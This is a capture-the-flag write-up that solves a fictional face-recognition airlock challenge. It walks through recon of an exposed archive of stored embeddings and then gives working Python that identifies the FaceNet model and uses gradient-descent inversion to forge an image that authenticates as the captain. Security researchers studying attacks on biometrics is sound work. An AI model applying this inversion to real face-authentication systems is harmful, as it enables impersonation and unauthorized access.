---
layout: post
title: "Mask of Injectus IX"
category: "Embedding Inversion"
difficulty: Hard
points: 90
event: "2026: An AI Odyssey"
date: 2026-05-28
---
## Mission Briefing

> The Injectus IX airlock is gated by a face-recognition stack. Crew members submit a portrait, the encoder hashes it into a 512-dim embedding, and the airlock matches against stored templates. The flag is bound to Captain Vex Morrigan's clearance — and her portrait is not in the public roster. Get in anyway.

---

## Reconnaissance

### Target: `http://<TARGET_IP>`

The web app presented a biometric portal with:
- A **crew roster** (public portraits for 7 crew members)
- A **portrait upload** interface that submits to `/api/auth`
- Captain Vex Morrigan listed as **"PORTRAIT OFFLINE"**

### Burp Suite Recon

Intercepting traffic revealed crew data fetched from individual endpoints:
```
GET /crew/k.adler
GET /crew/v.morrigan   ← target
```

### JavaScript Analysis

Reading `/static/app.js` revealed the API structure:

```javascript
const fd = new FormData();
fd.append("photo", inp.files[0]);
const r = await fetch("/api/auth", { method: "POST", body: fd });
```

Response format:
```json
{
  "decision": "AUTHORIZED",
  "similarity": 0.9924,
  "threshold": 0.65,
  "user": {"id": "k.adler", "name": "Kira Adler"},
  "clearance": "CAPTAIN",
  "fleet_directive": "<FLAG HERE>"
}
```

**Key insight:** Clearance = `CAPTAIN` unlocks the fleet directive (flag). Threshold is **0.65**.

### Robots.txt Discovery

```
Disallow: /static/archive/
# internal artefacts are kept under archive; do not crawl
```

### Archive Goldmine

`/static/archive/` exposed:
- `face_recognition_v3.safetensors` — **9 crew embeddings (512-dim)**
- `face_recognition_v3.metadata.json` — crew roster with index order
- `legacy_manifest.png` — degraded portrait of Vex Morrigan (marked "PORTRAIT OFFLINE")
- `README.md` — describes the face-auth stack

---

## Key Findings

### Extracting Morrigan's Embedding

```python
from safetensors import safe_open
import numpy as np

with safe_open("face_recognition_v3.safetensors", framework="numpy") as f:
    templates = f.get_tensor("templates")  # shape: (9, 512)

# Index 8 = v.morrigan (per metadata.json)
morrigan_embedding = templates[8]
print(f"Norm: {np.linalg.norm(morrigan_embedding):.4f}")  # 1.0000
print(f"Std: {morrigan_embedding.std():.4f}")              # 0.0441
```

### Model Identification

The embedding signature (`std ≈ 0.0441`, L2-normalized, 512-dim) pointed to a face recognition model. Testing candidates against known crew embeddings:

```python
from facenet_pytorch import InceptionResnetV1, MTCNN

model = InceptionResnetV1(pretrained='vggface2').eval()
mtcnn = MTCNN(image_size=160, margin=20)

# Test on crew photos
for path, idx in crew:
    img = Image.open(path)
    face = mtcnn(img)
    emb = model(face.unsqueeze(0))[0].numpy()
    emb = emb / np.linalg.norm(emb)
    sim = np.dot(emb, templates[idx])
    print(f"{path}: {sim:.4f}")
```

Results:
```
k.adler.jpg:  0.9740  ✓
m.okafor.jpg: 0.9810  ✓
s.varga.jpg:  0.9771  ✓
a.delarue.jpg: 0.9666 ✓
```

**Model confirmed: FaceNet InceptionResnetV1 (VGGFace2) + MTCNN alignment**

---

## The Attack: Embedding Inversion

With the exact model and Morrigan's embedding, we perform **gradient-based model inversion** — optimizing pixel values so the model produces an embedding matching Morrigan's stored template.

### Starting Point

`legacy_manifest.png` contains a deliberately degraded portrait of Morrigan. MTCNN detects the face and gives us a starting point:

```
Pre-optimization similarity to Morrigan: 0.5248
```

### Gradient Descent Inversion

```python
from facenet_pytorch import InceptionResnetV1, MTCNN
import torch
import numpy as np
from PIL import Image
from safetensors import safe_open

# Load target embedding
with safe_open("face_recognition_v3.safetensors", framework="numpy") as f:
    templates = f.get_tensor("templates")
morrigan_target = torch.tensor(templates[8], dtype=torch.float32)

# Load model
model = InceptionResnetV1(pretrained='vggface2').eval()
mtcnn = MTCNN(image_size=160, margin=20)

# Detect and align Morrigan's face from manifest
manifest = Image.open("legacy_manifest.png")
face = mtcnn(manifest)  # Returns aligned face tensor [-1, 1]

# Optimize pixel values toward Morrigan's embedding
face_tensor = face.unsqueeze(0).clone().detach().requires_grad_(True)
optimizer = torch.optim.Adam([face_tensor], lr=0.01)

for step in range(300):
    optimizer.zero_grad()
    x = face_tensor.clamp(-1, 1)
    emb = model(x)
    emb = emb / emb.norm(dim=-1, keepdim=True)
    
    # Maximize cosine similarity to Morrigan's embedding
    loss = -torch.dot(emb[0], morrigan_target)
    loss.backward()
    optimizer.step()
    
    if step % 20 == 19:
        print(f"Step {step+1}: local_sim={-loss.item():.4f}")
```

### Result

After just **20 steps**, local similarity reached **0.9977**.

Submitting to the server:
```json
{
  "clearance": "CAPTAIN",
  "decision": "AUTHORIZED",
  "fleet_directive": "THM{m4sk_0f_1nj3ctus_b1m3tr1c_inv3rs10n}",
  "ok": true,
  "similarity": 0.958,
  "threshold": 0.65,
  "user": {
    "id": "v.morrigan",
    "name": "Vex Morrigan",
    "rank": "Captain (CO)"
  }
}
```

**Flag: `THM{m4sk_0f_1nj3ctus_b1m3tr1c_inv3rs10n}`** 🎉

### The Inverted Portrait

The image that fooled the airlock at 0.958 similarity:

![Morrigan Inverted](morrigan_final.png)

> Gradient descent doesn't care about aesthetics. This nightmare pixel blob is mathematically Captain Vex Morrigan.

---

## Attack Chain Summary

```
1. Recon robots.txt → /static/archive/ exposed
2. Download safetensors → extract Morrigan's 512-dim embedding
3. Download legacy_manifest.png → blurry face of Morrigan
4. Identify model: FaceNet InceptionResnetV1 (VGGFace2) + MTCNN
   - Confirmed by std=0.0441 and 0.97+ similarity on crew photos
5. Gradient-based inversion: optimize pixels toward target embedding
6. Submit → similarity 0.958 → CAPTAIN clearance → flag
```

---

## Key Lessons

### 1. Embedding Inversion is a Real Attack
Given a target embedding vector and the encoder model, an attacker can reconstruct an image that authenticates as the target identity — **without ever having their actual photo**.

### 2. Model Identification via Embedding Fingerprinting
The embedding's statistical properties (std, norm, value range) act as a fingerprint. Comparing against known models with anchor images is a reliable identification technique.

### 3. Don't Brute Force — Think Mathematically
The rate limiter was intentional — designed to prevent random sampling attacks and guide solvers toward the correct mathematical approach. The intended solution requires only a handful of API calls.

### 4. The Archive is Always Worth Checking
`robots.txt` Disallow entries often point to the most valuable assets. The archive contained everything needed to solve the challenge.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Burp Suite | API endpoint discovery, request interception |
| `safetensors` | Extract embedding templates |
| `facenet-pytorch` | InceptionResnetV1 + MTCNN |
| `torch` | Gradient-based inversion |
| `exiftool` | Metadata analysis |
| `ffuf` | Directory enumeration |
| Python 3 | Scripting |

---

*Written by ByteChef — [GitHub Portfolio](https://github.com/the-byte-chef)*
